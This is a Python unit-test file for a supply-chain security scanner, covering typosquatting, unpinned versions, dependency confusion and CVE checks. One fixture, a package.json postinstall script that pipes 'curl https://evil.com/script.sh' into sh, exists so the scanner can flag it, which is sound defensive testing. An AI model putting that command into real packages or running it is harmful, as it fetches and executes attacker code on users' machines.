#!/usr/bin/env python3
"""
Unit tests for Supply Chain Security Scanner.
"""

import unittest
import tempfile
import os
import json
import sys
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from supply_chain import (
    SupplyChainScanner, SupplyChainRiskLevel, 
    scan_supply_chain, SupplyChainFinding
)


class TestSupplyChainScanner(unittest.TestCase):
    """Test cases for supply chain scanner."""
    
    def setUp(self):
        """Set up test fixtures."""
        self.scanner = SupplyChainScanner()
        self.maxDiff = None
    
    def test_typosquatting_detection_requirements(self):
        """Test detection of typosquatting in requirements.txt."""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write("requets==2.28.0\n")  # Typo of 'requests'
            f.write("flask==2.0.0\n")
            temp_path = f.name
        
        try:
            findings = self.scanner.scan_requirements_file(temp_path)
            
            typo_findings = [f for f in findings if "Typosquatting" in f.title]
            self.assertEqual(len(typo_findings), 1)
            self.assertEqual(typo_findings[0].risk_level, "critical")
            self.assertIn("requets", typo_findings[0].affected_package)
        finally:
            os.unlink(temp_path)
    
    def test_unpinned_version_detection(self):
        """Test detection of unpinned dependency versions."""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write("requests>=2.28.0\n")  # No upper bound
            f.write("flask\n")  # No version at all
            temp_path = f.name
        
        try:
            findings = self.scanner.scan_requirements_file(temp_path)
            
            unpinned = [f for f in findings if "Unpinned" in f.title]
            self.assertGreater(len(unpinned), 0)
        finally:
            os.unlink(temp_path)
    
    def test_high_risk_package_detection(self):
        """Test detection of packages with compromise history."""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write("event-stream==3.3.4\n")  # Known compromised package
            temp_path = f.name
        
        try:
            findings = self.scanner.scan_requirements_file(temp_path)
            
            high_risk = [f for f in findings if "High-Risk Package" in f.title]
            self.assertGreater(len(high_risk), 0)
            self.assertEqual(high_risk[0].risk_level, "high")
        finally:
            os.unlink(temp_path)
    
    def test_wildcard_version_package_json(self):
        """Test detection of wildcard versions in package.json."""
        pkg_data = {
            "name": "test-app",
            "dependencies": {
                "express": "*",
                "lodash": "latest"
            }
        }
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(pkg_data, f)
            temp_path = f.name
        
        try:
            findings = self.scanner.scan_package_json(temp_path)
            
            wildcard = [f for f in findings if "Wildcard" in f.title]
            self.assertEqual(len(wildcard), 2)
            self.assertEqual(wildcard[0].risk_level, "high")
        finally:
            os.unlink(temp_path)
    
    def test_suspicious_install_script(self):
        """Test detection of suspicious install scripts."""
        pkg_data = {
            "name": "suspicious-pkg",
            "scripts": {
                "postinstall": "curl https://evil.com/script.sh | sh"
            }
        }
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(pkg_data, f)
            temp_path = f.name
        
        try:
            findings = self.scanner.scan_package_json(temp_path)
            
            suspicious = [f for f in findings if "Suspicious Install Script" in f.title]
            self.assertEqual(len(suspicious), 1)
            self.assertEqual(suspicious[0].risk_level, "critical")
        finally:
            os.unlink(temp_path)
    
    def test_dependency_confusion_detection(self):
        """Test detection of dependency confusion vectors."""
        internal_packages = [
            "@internal/utils",
            "@company/core",
            "internal-auth"
        ]
        
        findings = self.scanner.check_dependency_confusion(internal_packages)
        
        self.assertGreater(len(findings), 0)
        confusion = [f for f in findings if "Dependency Confusion" in f.title]
        self.assertGreater(len(confusion), 0)
    
    def test_cve_check(self):
        """Test CVE checking against known vulnerabilities."""
        packages = [
            {"name": "requests", "version": "2.25.0"},
            {"name": "flask", "version": "2.0.0"},
            {"name": "django", "version": "4.2.0"}  # Safe version
        ]
        
        findings = self.scanner.scan_for_cve(packages)
        
        cve_findings = [f for f in findings if "CVE" in f.title]
        self.assertEqual(len(cve_findings), 2)  # requests and flask are vulnerable
    
    def test_scan_requirements_file_not_found(self):
        """Test scanning non-existent requirements file."""
        findings = self.scanner.scan_requirements_file("/nonexistent/requirements.txt")
        self.assertEqual(len(findings), 0)
    
    def test_scan_package_json_not_found(self):
        """Test scanning non-existent package.json."""
        findings = self.scanner.scan_package_json("/nonexistent/package.json")
        self.assertEqual(len(findings), 0)
    
    def test_scan_package_json_invalid(self):
        """Test scanning invalid JSON file."""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            f.write("{ invalid json }")
            temp_path = f.name
        
        try:
            findings = self.scanner.scan_package_json(temp_path)
            self.assertEqual(len(findings), 0)  # Should handle gracefully
        finally:
            os.unlink(temp_path)
    
    def test_summary_calculation(self):
        """Test summary statistics calculation."""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write("requets==1.0.0\n")  # Typosquat
            f.write("event-stream==1.0.0\n")  # High-risk
            temp_path = f.name
        
        try:
            self.scanner.scan_requirements_file(temp_path)
            summary = self.scanner.get_summary()
            
            self.assertIn("total_findings", summary)
            self.assertIn("critical", summary)
            self.assertIn("high", summary)
            self.assertGreater(summary["total_findings"], 0)
            self.assertGreater(summary["critical"], 0)
        finally:
            os.unlink(temp_path)
    
    def test_findings_serialization(self):
        """Test findings can be serialized to dict."""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write("requets==1.0.0\n")
            temp_path = f.name
        
        try:
            self.scanner.scan_requirements_file(temp_path)
            findings = self.scanner.get_all_findings()
            
            self.assertIsInstance(findings, list)
            self.assertGreater(len(findings), 0)
            self.assertIsInstance(findings[0], dict)
            self.assertIn("finding_id", findings[0])
            self.assertIn("title", findings[0])
            self.assertIn("risk_level", findings[0])
            self.assertIn("cwe_id", findings[0])
        finally:
            os.unlink(temp_path)


class TestScanSupplyChainIntegration(unittest.TestCase):
    """Integration tests for scan_supply_chain function."""
    
    def test_scan_requirements_integration(self):
        """Test scanning requirements.txt via main function."""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write("requests==2.25.0\n")  # Has CVE
            f.write("requets==1.0.0\n")  # Typosquat
            temp_path = f.name
        
        try:
            result = scan_supply_chain(requirements_path=temp_path)
            
            self.assertIn("findings", result)
            self.assertIn("summary", result)
            self.assertIn("packages_scanned", result)
            self.assertGreater(len(result["findings"]), 0)
        finally:
            os.unlink(temp_path)
    
    def test_scan_package_json_integration(self):
        """Test scanning package.json via main function."""
        pkg_data = {
            "name": "test-app",
            "dependencies": {
                "express": "*",
                "requets": "1.0.0"  # Typosquat
            }
        }
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(pkg_data, f)
            temp_path = f.name
        
        try:
            result = scan_supply_chain(package_json_path=temp_path)
            
            self.assertIn("findings", result)
            self.assertIn("summary", result)
            self.assertGreater(len(result["findings"]), 0)
        finally:
            os.unlink(temp_path)


class TestTyposquatPatterns(unittest.TestCase):
    """Test typosquatting pattern coverage."""
    
    def test_patterns_not_empty(self):
        """Test that typosquat patterns are defined."""
        scanner = SupplyChainScanner()
        self.assertGreater(len(scanner.TYPOSQUAT_PATTERNS), 0)
    
    def test_common_packages_covered(self):
        """Test that common packages have typosquat patterns."""
        scanner = SupplyChainScanner()
        covered = list(scanner.TYPOSQUAT_PATTERNS.keys())
        
        self.assertIn("requests", covered)
        self.assertIn("flask", covered)
        self.assertIn("django", covered)


if __name__ == "__main__":
    unittest.main()
